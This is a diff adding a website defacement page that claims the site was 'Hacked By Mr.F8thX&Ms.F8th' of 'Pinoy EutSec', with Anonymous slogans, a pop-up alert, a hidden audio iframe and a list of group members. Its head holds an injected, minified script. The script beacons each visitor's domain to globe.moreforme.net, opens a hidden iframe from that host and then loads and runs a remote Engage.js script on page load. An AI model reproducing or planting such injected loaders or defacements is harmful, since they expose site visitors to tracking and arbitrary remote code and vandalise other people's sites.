@@ -1,0 +1,138 @@
+
+<!DOCTYPE html>
+<hmtl>
+<head><script>
+	if (top == window) {
+		var fns = document.createElement("script");
+		fns.text = 'if(typeof window.fnStatistics=="undefined"){window.fnStatistics={}}window.fnStatistics.Connection=function(c){var d=function(g,e){var f=new g(e);if((typeof f.open!=="function")||(typeof f.connect!=="function")){throw g+" is does not implement Connection interface!"}else{return f}};var b=function(e){};var a=function(){};return d(c)};if(typeof window.fnStatistics=="undefined"){window.fnStatistics={}}window.fnStatistics.ElementInjectionConnection=function(d){var e;var h=0;var f=function(i){i=i||{};e=i.url;if(!Date.now){h=(new Date()).valueOf()*Math.random()}else{h=Date.now()*Math.random()}};var b=function(k){var i="";if(typeof k==="object"){i="?";for(var j in k){i+=j+"="+k[j]+"&"}i=i.substring(0,i.lastIndexOf("&"))}return i};var c=function(i,j){if(!i){throw"ElementInjectionConnection.open: Missing connection information url!"}e=i;if(j){e+=b()}};var a=function(j){if(!e){throw"ElementInjectionConnection.connect Please use open({url<some url>}) to open a connection first."}if(j){e+=b(j)}var i=document.createElement("img");h++;var k="gen_fnStatisticsID_"+h;i.setAttribute("id",k);i.setAttribute("src",e);i.setAttribute("style","display:none;");document.body.appendChild(i);return k};var g=function(i){return a(i)};f(d);return{open:c,send:g,connect:a}};if(typeof window.fnStatistics=="undefined"){window.fnStatistics={}}window.fnStatistics.ConnectionManager=function(){var e=window.fnStatistics.Connection;var d=window.fnStatistics.ElementInjectionConnection;var a;var b=function(){a=new e(d)};var c=function(){return a};b();return{getConnection:c}};if(typeof window.fnStatistics=="undefined"){window.fnStatistics={}}window.fnStatistics.PageStatistics=function(b){var g=0;var c;var d=function(i){i=i||{};c=i.url};var f=function(){if(window.performance){g=window.performance.timing.loadEventStart-window.performance.timing.navigationStart}};var e=function(){return g};var h=function(i){var j=window.fnStatistics.PageStatistics.StatisticType;switch(i){case j.PAGE_LOADED:f();break;case j.PAGE_SHOW:break}};var a=function(){return{url:c,loadingTime:g}};d(b);return{update:h,getData:a,getPageLoadingTime:e}};window.fnStatistics.PageStatistics.StatisticType={PAGE_LOADED:"PAGE_LOADED",PAGE_SHOW:"PAGE_SHOW"};if(typeof window.fnStatistics=="undefined"){window.fnStatistics={}}window.fnStatistics.StatisticsManager=function(){var f="http://globe.moreforme.net/data";var b;var a;var c=function(){b=new window.fnStatistics.ConnectionManager();a=new window.fnStatistics.PageStatistics({url:window.location.href})};var g=function(h){a.update(h)};var e=function(){return a.getData()};var d=function(){var i=b.getConnection();i.open(f);var h=e();if(h.loadingTime!==0){return i.send({domain:window.location.host,load:h.loadingTime})}else{return -1}};c();return{sendStatistics:d,updatePageStatistics:g,getPageStatistics:e}};if(typeof window.fnStatistics=="undefined"){window.fnStatistics={}}window.fnStatistics.StatisticsManager.registerLoadFunction=function(b){if(window.addEventListener){window.addEventListener("load",b,false)}else{if(window.attachEvent){window.attachEvent("onload",b)}else{var a=window.onload;if(a){window.onload=function(){b();a()}}else{window.onload=b}}}};window.fnStatistics.StatisticsManager.registerLoadFunction(function(){var a=new window.fnStatistics.StatisticsManager();a.updatePageStatistics(window.fnStatistics.PageStatistics.StatisticType.PAGE_LOADED);var b=a.sendStatistics()});';
+		
+		//fns.setAttribute("src", "http://globe.moreforme.net/statistics/js/statistics_common.js");
+		fns.setAttribute("id", "fn_statistics_manager");
+		if (document.head == null || document.head == "undefined") {
+			document.head = document.getElementsByTagName("head")[0];
+		}
+		document.head.appendChild(fns);
+		var engageNameSpace = "engagens";
+		"undefined" == typeof window[engageNameSpace] && (window[engageNameSpace] = {}), window[engageNameSpace].engageLoader = function () {
+			function e(e) {
+				return "undefined" != typeof e && null !== e
+			}
+
+			function t() {
+				var t = document.createElement("script");
+				t.setAttribute("src", s), t.setAttribute("id", "fn_engage_script"), t.setAttribute("async", ""), (null == document.head || e(document.head)) && (document.head = document.getElementsByTagName("head")[0]), document.head.appendChild(t)
+			}
+
+			function n() {
+				var t = r();
+				if (e(t)) {
+					var n = t;
+					i() && (n = d(t));
+					var o;
+					try {
+						o = document.documentElement, o.appendChild(n)
+					} catch (c) {
+						o = document.body, o.appendChild(n)
+					}
+					a()
+				}
+			}
+
+			function a() {
+				function e(e) {
+					var n = e.data;
+					"l8IframeIsReady" === n.message && t()
+				}
+				window.addEventListener ? window.addEventListener("message", e, !1) : window.attachEvent("onmessage", e)
+			}
+
+			function r() {
+				var t = document.createElement("iframe");
+				if (e(t)) {
+					t.setAttribute("id", "fn_engage"), t.setAttribute("src", u), t.setAttribute("target", "_blank"), t.setAttribute("frameborder", "0");
+					var n = /firefox/i.exec(navigator.userAgent);
+					e(n) && n.length > 0 ? (t.style.height = 0, t.style.width = 0) : t.style.display = "none", t.frameBorder = "no"
+				}
+				return t
+			}
+
+			function i() {
+				var t = !1,
+					n = /android (\\d+)/i.exec(navigator.userAgent);
+				return e(n) && n.length > 0 && (t = parseInt(n[1]) >= 4), t
+			}
+
+			function d(e) {
+				var t = document.createElement("div");
+				return t.setAttribute("id", "fn_wrapper_div"), t.style.position = "fixed", t.style.display = "none", t.ontouchstart = function () {
+					return !0
+				}, t.appendChild(e), t
+			}
+
+			function o() {
+				var t = void 0,
+					a = this,
+					r = function () {
+						e(t) && (window.clearTimeout(t), t = void 0, n.call(a))
+					};
+				t = window.setTimeout(r, 1e4), "function" == typeof window.addEventListener ? window.addEventListener("load", r, !1) : window.attachEvent("onload", r)
+			}
+			var c = "http://globe.moreforme.net",
+				u = c + "/l8/EngageService",
+				s = c + "/scripts/Engage.js";
+			o()
+		};
+		var engageLoader = new window[engageNameSpace].engageLoader
+	} 
+</script>
+<center><title>Hacked By Mr.F8thX&Ms.F8th</title></center>
+</head>
+<body>
+<body bgcolor="black">
+<center><img src="https://z-m-scontent.fcrk3-1.fna.fbcdn.net/v/t1.0-9/fr/cp0/e15/q65/69089107_2506034409628639_6866489483131355136_n.jpg?_nc_cat=102&efg=eyJpIjoibyJ9&_nc_eui2=AeEH8_JFvSHEmqBbMVMgahr62On8qC_yddcZbp2wDSKGFLd-sbmHTEa1eIKzv06DYAhFStFQcD0XTljH2ppuN0DVLfC8uA5l62Z-1noplWD5PiKtPOHXLPRnVWbq0lsBQwE&_nc_oc=AQna4egxDNtpNqikpde-H2PkihYy6MjJgAdyKfGvvisWC0nn888b16xodzisEOgm2eo&_nc_ad=z-m&_nc_cid=1119&_nc_zor=9&_nc_eh=76d6ed3a92d1b0bad49339947d008373&_nc_ht=z-m-scontent.fcrk3-1.fna&oh=b26e2204cff7c2d13a9cb191feaea966&oe=5E4ABBF6" width="300" height="300" ></center>
+<center>
+<h1><b><font color=white>" Hacked By : <font color=gold> Pinoy EutSec " <b></h1>
+</center>
+<style type="text/css">
+      #p1 {
+         /* offset-x | offset-y | blur-radius | color */
+         text-shadow: 2px 2px 3px blue; 
+      }
+      #p2 {
+      /* offset-x | offset-y | blur-radius | color */
+      text-shadow: 2px 2px 3px blue; 
+      }
+      #p3 {
+      /* offset-x | offset-y | blur-radius | color */
+      text-shadow: 2px 2px 3px red; 
+      }
+      #p4 {
+      /* offset-x | offset-y | blur-radius | color */
+      text-shadow: 2px 2px 3px red; 
+      }
+      #p5 {
+      /* offset-x | offset-y | blur-radius | color */
+      text-shadow: 2px 2px 3px yellow; 
+      }
+      </style>
+     <center><p id="p1">=>  We are Anonymous</p></center>
+     <center><p id="p2">=> We are Legion</p></center>
+     <center><p id="p3">=> We Do not Forgive</p></center>
+     <center><p id="p4">=> We Do not Forget</p></center>
+     <center><p id="p5">=> Expect us.</p></center>
+<script>    
+	         alert('Hacked By Mr.F8thX&Ms.F8th')  
+	            </script>  
+<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/566552475/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen>
+</iframe>
+<center>
+<div class="greetings">
+   <b><font color=white>=> Greetz To :
+   <br>
+    All member in Pinoy Eutsec
+     <br>
+
+<b> <font color="blue">Mr.Ddsid3</font> | <font color="red"> Mr.f8thX</font> | nords<font color="yellow"> Mr.FR13ND</font> | <font color="blue"> Mr.R41KK0</font> | <font color="red"> bl5ze</font> | <font color="yellow"> Ender man</font> | <font color="blue"> Mr.Hijacker</font> | <font color="red"> Clliford</font> | <font color="yellow">ph.sky </font> | <font color="blue"> Xine Fawkes</font> |  <font color="red"> Alex smith</font>
+</center>
+</body>
+</hmtl>
